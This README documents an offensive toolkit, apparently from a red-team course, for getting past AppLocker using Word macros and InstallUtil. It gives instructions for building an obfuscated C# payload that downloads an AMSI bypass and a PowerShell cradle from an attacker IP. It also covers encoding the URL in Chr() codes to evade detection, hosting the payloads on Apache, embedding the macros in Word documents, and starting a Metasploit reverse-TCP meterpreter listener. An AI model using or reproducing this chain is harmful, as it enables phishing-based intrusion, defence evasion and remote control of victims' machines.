# InstallUtil AppLocker Bypass

Two AppLocker-safe delivery paths from a Word macro. Both use **"fruiting"** string
obfuscation — every ASCII string is rebuilt at runtime from its decimal `Chr()` codes
(the same tradecraft as the Office macro runners), so no plaintext URL / command sits
in the document or the binary.

| File | Purpose |
|---|---|
| `installutil.cs` | C# payload — runs via `installutil.exe /U`, downloads AMSI bypass + payload over HTTP (URL is fruited) |
| `vbagen.py` | Python helper — prints the fruited (decimal `Chr()`) VBA string constants |
| `vbagen-macro.vba` | VBA macro — decodes strings at runtime (fruiting), spawns download+exec via WMI + InstallUtil |
| `vba-direct-macro.vba` | Simpler alternative — VBA runs the payload directly (no InstallUtil), because macros are not limited by AppLocker |

## Which one should I use?

- **`vbagen-macro.vba`** — full LOLBin chain: macro → WMI → bitsadmin download →
  `installutil.exe /U` → PowerShell cradle. Use when you want the InstallUtil bypass
  documented end-to-end.
- **`vba-direct-macro.vba`** — the macro runs the download cradle itself. VBA executes
  inside the allowed Office process, so AppLocker's EXE/script rules don't apply.
  Use this first (fewer moving parts). If PowerShell itself is locked down (CLM/AMSI),
  use the in-memory shellcode runner macros instead (`../xor-shellcode-runner/`,
  `../alternative-shellcode-runner/`, `../caesar-cipher/`).

## Usage — vbagen-macro.vba (InstallUtil chain)

**1. Update the attacker IP in `installutil.cs`, then compile it.**

The URL is stored as decimal codes. Regenerate the array for your IP:

```bash
python3 -c "print(', '.join(str(ord(c)) for c in 'http://<YOUR_IP>/'))"
```

Paste the result into the `url` array in `installutil.cs`.

**Visual Studio:** Console App (.NET Framework) → replace `Program.cs` → add
references `System.Management.Automation` + `System.Configuration.Install` → Release / x64 → Build.

**Command line:**

```powershell
csc /target:exe /platform:x64 /optimize+ /out:InstallUtil.exe installutil.cs `
    /r:"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" `
    /r:System.Configuration.Install.dll
```

**2. Host three files on your HTTP server:** `InstallUtil.exe`, `amsi.txt`, `run.txt`.

```bash
sudo systemctl start apache2
sudo cp InstallUtil.exe amsi.txt run.txt /var/www/html/
```

**3. Update the IP in `vbagen.py` and run it** to print the fruited `a`/`b`/`c`/`d`:

```bash
python3 vbagen.py
```

**4. Paste the output into `vbagen-macro.vba`** (replace the `a`, `b`, `c`, `d` lines).

**5. Insert into Word** (Alt+F11 → Insert → Module → paste → save `.doc` / `.docm`).

## Usage — vba-direct-macro.vba (no InstallUtil)

1. Update the IP in `vbagen.py`, run it, copy the printed `cmd` line.
2. Paste into `vba-direct-macro.vba` (replace the `cmd = Chr(...)` block).
3. Insert into Word.

## Listener

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
```
